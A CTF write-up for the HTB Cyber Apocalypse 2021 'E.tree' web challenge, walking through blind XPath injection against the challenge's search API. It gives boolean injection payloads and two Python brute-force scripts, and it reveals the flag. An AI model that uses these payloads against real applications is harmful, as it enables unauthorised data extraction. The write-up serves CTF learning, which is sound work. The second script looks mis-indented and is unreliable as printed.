+++
title = 'E.tree - HTB Cyber Apocalypse 2021'
date = 2021-04-24 11:11:30-04:00
draft = false
+++

**tl;dr**
+ X-Path injection
<!--more-->

E.Tree was a medium level challenge in the web category of the Cyber Apocalypse CTF organized by Hack The Box.

![](https://cdn-images-1.medium.com/max/2000/1*r4VvPMUoHVOzsO27pVvsAA.png)

This is a detailed writeup on how I approached the challenge and finally managed to solve it. If you are looking for a short solution, skip to the end where I have attached the script I used to solve this challenge.

Upon starting the docker instance and navigating to the given link, we are presented with what looks an employee directory web app where we can search for a particular employee name and it will tell us whether the particular staff member exists or not.

![](https://cdn-images-1.medium.com/max/3150/1*a3z6cI7kD65-qYtHb5jV-Q.png)

On intercepting the request using burp suite, we can see that the backend uses the Werkzeug/1.0.1 server which has a couple of vulnerabilities(mostly for previous versions) which can be found upon a quick google search but none of them ended up working.

The challenge also contained a downloadable file which was an XML document which points to some sort of database management system using XML. Googling for vulnerabilities on that lead me to X-Path injection which I confirmed with the payload ' or 1=1 or 'a'='a .

![](https://cdn-images-1.medium.com/max/3138/1*euvAfnCkN0RVX6KRm4OH_w.png)

X-Path is the query language used to extract data from XML document and I was sure that X-Path injection was the way to go but I had no idea how to proceed. The last time I saw a similar challenge was in [picoCTF 2021](https://picoctf.org/) where I had managed to find the vulnerability but could not extract the flag.

After reading some writeups and articles about X-Path injection, I realised that the challenge consisted of blind X-Path injection where the only output we get is a boolean value(in this case, “exists” or “does not exist”). I came across this awesome writeup of “X marks the spot” picoCTF challenge which helped me understand the X-Path queries used and gave me an idea on how to solve the challenge.
[**Blind XPath Injections: The Path Less Travelled**
*This article is inspired by the "X marks the spot" challenge in picoCTF 2021. For the solution to the challenge, skip…*dev.to](https://dev.to/zeyu2001/blind-xpath-injections-the-path-less-travelled-ope)

The XML document has a tree structure and can be split into nodes. The given XML document has “military” as the root node.

The given XML document had the following structure and a fake flag to give us an idea on where we could find the flag.

![](https://cdn-images-1.medium.com/max/2000/1*1s-kCWpVrbu2vKc-tyx9BA.png)

We can see that it has 16 occurrences of the “staff” node(complete xml document not in above picture) which we can confirm is the same on the server by using the command:

    ' or count(//staff)=**NUM**  or '2'='1
> Basic XPath queries consist of path expressions. / will select from the root node, while // will select nodes no matter where they are in the document. That is why using “//staff” has the same effect as using “/military/district/staff”.

I used intruder in burp suite to brute force the value of **NUM **to find the exact number of occurrences of “staff” and here we can see that the length of the response corresponding to value 16 is different from the others and on inspecting the response, we can see that it returns true, indicating that there are exactly 16 “staff” nodes.

![](https://cdn-images-1.medium.com/max/2000/1*WG1nX4D2U037oNJDyAcOxg.png)

After confirming that the basic structure of the XML document in the server is similar to that of the one provided, we can make the following assumption.

According to the given XML file, the flag is in two parts and is supposed to be in the node “selfDestructCode”. Using the same “count” X-Path function to find the number of occurrences of “selfDestructCode” returns true for 2.

![](https://cdn-images-1.medium.com/max/2000/1*I_KznGozq-rDS3LvGMgAmw.png)

So our next step is to try to find out the length of the string(flag) stored in each of the “selfDestructCode” nodes and that can be done using the command:

    ' or string-length(//selfDestructCode[position()=**POS**])=**NUM  **or '2'='1

![**POS=1**](https://cdn-images-1.medium.com/max/2000/1*6sRxIj6GYIo7aEBvhjVYyw.png)***POS=1***

![**POS=2**](https://cdn-images-1.medium.com/max/2000/1*hVHVZDZ7fraXPbk-1lD-2w.png)***POS=2***

In this case, **POS **can only have values ‘1’ and ‘2’ and running the above command with burp suite intruder shows that the first occurrence of “selfDestructCode” is 21 characters long but the second occurrence is 0 characters long i.e. it is empty.

This was confusing but I decided to go ahead and extract the characters from the first position anyway. Burp suite is too slow to brute force every printable character and I ended up using the following script my teammate, *downgrade, *wrote.

    *import requests*

    *from string import printable*

    *printable = printable.replace("'", '')*

    *url = "http://139.59.189.95:30781/api/search"*

    *flag = ''*

    *def testFlag(flag):*

    *json={"search": f"' or substring((//selfDestructCode[position()=1]),1,{len(flag)})='{flag}'  or '2'='1"}*

    *r = requests.post(url, json=json)*

    *print(f'\r{flag}', end='')*

    *return 'success' in r.text*

    *while len(flag) <= 21:*

    *  for i in printable:*

    *    if testFlag(flag + i):*

    *    flag += i*

    *  break*

Running this script gives us the first 21 characters of the flag i.e. the first part. According to the given XML document, changing POS in the following segment of the code to 2 should give us the second part of the flag. *//selfDestructCode[position()=POS]*

But as we found earlier, there is nothing in the second part of “selfDestructCode” :(
> This is where I got stuck for a while but then I thought that maybe they had moved the flag to some other part of the document. So to find the flag, we basically have to extract the entire XML document.

This is where understanding the structure of the XML document came into play. In the given XML file, each “staff” node had 4 child nodes and the one with “selfDestructCode” had 5 child node. So maybe if we find the “staff” nodes with unique number of child nodes, we would only have to map out that part. But that turned out to be somewhat misleading as the first “staff” node itself had more than 20 child nodes contradictory to the expected 4 or 5😐. It was not an entire waste of time because upon further enumeration, I found out that every “staff” node after the 10th one had no child nodes.

    This is the syntax used to find the number of child nodes: count(//staff[position()=POS]/child::node())=NUM  or '2'='1"

Having a better idea about the structure of the XML document , I proceeded to check if every child node in the first “staff” node actually had any content.

    string-length(//staff[position()=1]/child::node()[position()=**POS**])=0 or '2'='1"}

Iterating the **POS** from 1–20 revealed that every node after 10 was empty.

So we end up with only 10 nodes, each with around 10 child nodes which we would have to extract.

After modifying the initial script to extract data from each node individually, I noticed that the 10th child node of the 3rd “staff” node had the first part of the flag! This lead me to think that maybe the 2nd part would also be in the 10th child node of one of the 10 “staff” nodes and luckily I was right.

Using the following script to extract 10th child node from the 1st to the 10th “staff” node, I got the first part of the flag in the 3rd “staff” node and the 2nd part of the flag in the 2nd “staff” node.

    import requests
    from string import printable

    printable = printable.replace("'", '')

    url = "[http://188.166.145.178:32535/api/search](http://188.166.145.178:32535/api/search)"
    flag = ''
    num=1
    f=0

    def testFlag(flag):
        json={"search": f"' or substring((//staff[position()={num}]/child::node()[position()=10]),1,{len(flag)})='{flag}'  or '2'='1"}
        r = requests.post(url, json=json)
        print(f'\r{flag}', end='')
        return 'success' in r.text

    while num<11:
     while len(flag) <=20:
      for i in printable:
       if testFlag(flag+i):
        flag +=i
        f=1
        break
       if i=='}':
        f=0
        break

    if(f==0):
       num=num+1
       flag=''
       print("")
       break

![](https://cdn-images-1.medium.com/max/2000/1*1GhJMzNWGTja3syETLSO8A.png)

The output of the script looks like this.
> Joining the two parts together, we get this flag: CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}

This was an amazing challenge and I learned a lot about X-Path injection and XML databases. If you have not already attempted this challenge and others from the [Cyber apocalypse CTF](https://ctf.hackthebox.eu/ctf/82), I highly recommend you do.

If you would like to read more about X-Path injection I highly recommend the following articles:
[**Security: XPath Injection. What? How?**
*It is a type of attack where a malicious input can lead to un-authorised access or exposure of sensitive information…*medium.com](https://medium.com/@shatabda/security-xpath-injection-what-how-3162a0d4033b)

[https://book.hacktricks.xyz/pentesting-web/xpath-injection#:~:text=XPath%20Injection%20is%20an%20attack,query%20or%20navigate%20XML%20documents](https://book.hacktricks.xyz/pentesting-web/xpath-injection#:~:text=XPath%20Injection%20is%20an%20attack,query%20or%20navigate%20XML%20documents).

[https://medium.com/r/?url=https%3A%2F%2Fdev.to%2Fzeyu2001%2Fblind-xpath-injections-the-path-less-travelled-ope](https://dev.to/zeyu2001/blind-xpath-injections-the-path-less-travelled-ope)

Thanks for reading!!